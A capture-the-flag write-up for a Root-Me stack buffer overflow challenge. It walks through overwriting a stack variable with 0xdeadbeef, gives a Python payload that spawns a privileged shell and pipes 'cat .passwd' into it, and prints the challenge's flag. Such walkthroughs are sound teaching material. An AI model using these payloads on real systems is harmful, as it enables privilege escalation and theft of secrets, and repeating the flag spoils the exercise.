## Challenge name: ELF x86 - Stack buffer overflow basic 1


<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/04895213-1eda-41e5-b4ab-b2d5693caf9d" />
<br>
<br>

``` Challenge Link:```  **https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1**
<br>
<br>

**Statement - Environment configuration:**

```
+------------------+-----------------------------------------------+
| Protection       | Description                                   |
+------------------+-----------------------------------------------+
| PIE              | Position Independent Executable               |
| RelRO            | Read Only relocations                         |
| NX               | Non-Executable Stack                          |
| Heap exec        | Non-Executable Heap                           |
| ASLR             | Address Space Layout Randomization            |
| SF               | Source Fortification                          |
| SRC              | Source code access                            |
+------------------+-----------------------------------------------+
```

<br>

**Source Code Given:**
```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

<br>

**Challenge connection informations:**

```
+------------------+-------------------------------------------------------------+
| Field            | Value                                                       |
+------------------+-------------------------------------------------------------+
| Host             | challenge02.root-me.org                                     |
| Protocol         | SSH                                                         |
| Port             | 2222                                                        |
| SSH access       | ssh -p 2222 app-systeme-ch13@challenge02.root-me.org        |
| Username         | app-systeme-ch13                                            |
| Password         | app-systeme-ch13                                            |
+------------------+-------------------------------------------------------------+
```

**Now we will connect to lab via ssh uisng the the creds from challenge connection information.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/e916b73e-246f-472e-b2bd-901360874b1c" />
<br>
<br>

**After connecting we can see that there is our binary and as you can see there is .passwd and with that binary we can cat it so lets begin.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/dba806a2-70dd-46e2-90b9-6cb4878af9f0" />
<br>
<br>

**In the code buffer defined to take user input was `char buf[40];` but input is read using `fgets(buf, 45, stdin)` which can read up to 44 bytes plus a null terminator. If more than 40 bytes are read, memory past `buf` will be overwritten and this allows us to overwrite adjacent stack variables.**

<br>
<img width="1318" height="450" alt="image" src="https://github.com/user-attachments/assets/af7ae160-3edb-47c5-b641-27567065b458" />
<br>
<br>

**As we know we can provide 40 plus bytes of junk and pass that first if conditional check because after 40+ bytes the check will be overwritten and will not be deadbeef and now to reach inside the second if condition which holds main stuff in this challenge we need to make the value of check equal to 0xdeadbeef. On x86 (little-endian), if you put a value like 0x04030201 in a variable, it is stored in the stack as `01 02 03 04`, which means 4321 but in big‑endian(older one not x86) 0x04030201 is stored as `04 03 02 01` in stack which simply means 4321. Little‑endian just changes how bytes are placed in memory/stack, not the actual value. Similarly, to set check = 0xdeadbeef, we need to write it in little‑endian order as `ef be ad de`. This does not mean anything in ASCII or OS‑wise like 0x04030201 means 1234, it is just raw hex bytes in a variable and we need to overwrite the variable in memory to go through that check/if cond. So our next payload will be 40 bytes of padding + these 4 bytes of `ef be ad de` overwrite check.**
<br><br>
**You may have a question like how do I know that after 40 bytes, the next 4 bytes overwrites check without showing memory layout, debugging, or offsets?** <br>
**-> And the answer is I don't know I am relying on compiler behavior + C stack layout conventions on x86.(But it’s not rigorous exploitation methodology and you have option to check the stack insted of assuming. This is quite acceptable for basic..)** <br>

```
// Stack frame layout
int var;
int check = 0x04030201;
char buf[40];

// On x86, compiler - no weird flags, locals are typically laid out like this (eg: stack-map):
higher addresses
-----------------
saved EIP
saved EBP
var        (4 bytes)
check      (4 bytes)
buf[40]    // Our input goes here..
-----------------
lower addresses
```

**[!] Reason these form stack-map shown up there:** <br>
**[+] The stack grows downward (higher addr -> lower addr)** <br>
**[+] Writing past the end of `buf` overwrites memory in ascending order (lower addr -> higher addr)** <br>
<br><br>
**Lets use python for simplicity to make 40 bytes of padding for first if + 4 bytes of deadbeef (`ef be ad de`) for second if to pass:**
<br><br>
```
//Understand:
check = 0x04030201  →  01 02 03 04 in memory // check is currently this 0x04030201..
check = 0xdeadbeef  →  ef be ad de in memory // we are making 0xdeadbeef to enter second if statement..

Payload:
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde');" | ./ch13
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/c7e0ce55-2631-462f-971e-32ce047e0d42" />
<br>
<br>

**It said you win and opened the shell runned bash for a sec and closed so when bash is running we have to provide args to bash to view our .passwd file to get flag. Using Payload:** <br><br>
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde'); sys.stdout.buffer.flush(); import time; time.sleep(0.2); sys.stdout.write('\ncat .passwd\n'); sys.stdout.flush(); time.sleep(1)" | ./ch13
```

**Step by step:**
<br><br>
```
b'A'*40                             # fills the 40-byte buf.
b'\xef\xbe\xad\xde'                 # this is little-endian encoding of 0xdeadbeef. This overwrites check.
sys.stdout.buffer.flush()           # sends the bytes to ch13.
time.sleep(0.2)                     # gives the program time to process the overflow.
sys.stdout.write('\ncat .passwd\n') # this is to execute cat .passwd but why is there even \n is it for python so it breaks line or for c program or for what reason ? ans: its not for python whatever is inside '' or "" inside write() it jsut sends it so now it goes to c program as stdin what it does? it takes 44 bytes ans it is consumed by fgets() and after that fgets puts \0 null terminator as list byte so its limit hits and then bash pops up and the remaining \ncat .passwd\n in stdin of main program ch13 is now inherited by bash and its shell property so the first \n is passed to bash but it means nothin to bash its just a junk bash reads line based input so it sees \n as empty command bash ignores it but its like preparing bash - guarantees bash is fully ready before the real command and why the second \n at end ? cuz bash executes commands only after enter and for shells or say for bash - \n means enter cat .passwd without \n would just sit in the input buffer and no execution.. 
time.sleep(1)                       # keeps the input alive so the command executes.
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/a874d8d8-d493-41a4-8e29-c605b021b751" />
<br>
<br>

**The Python script acts as stdin for ch13. When ch13 calls system("/bin/bash"), the spawned /bin/bash inherits the same stdin/stdout/stderr that ch13 is already using. The bytes sent first by Python or if we have send args manually the stdin to ch13 are consumed by fgets() up to 44 bytes  to overflow the buffer and overwrite check. After that, any remaining input written/given to executable is still sitting on stdin. When /bin/bash starts, it reads from that same stdin, so the remaining input (cat .passwd) is interpreted as a shell command and executed automatically.And bash exits according to the program was designed..**

**We can use this "1w4ntm043pr0np1s" as flag/passwd to validate the challenge..** <br>
**Thankyou.**



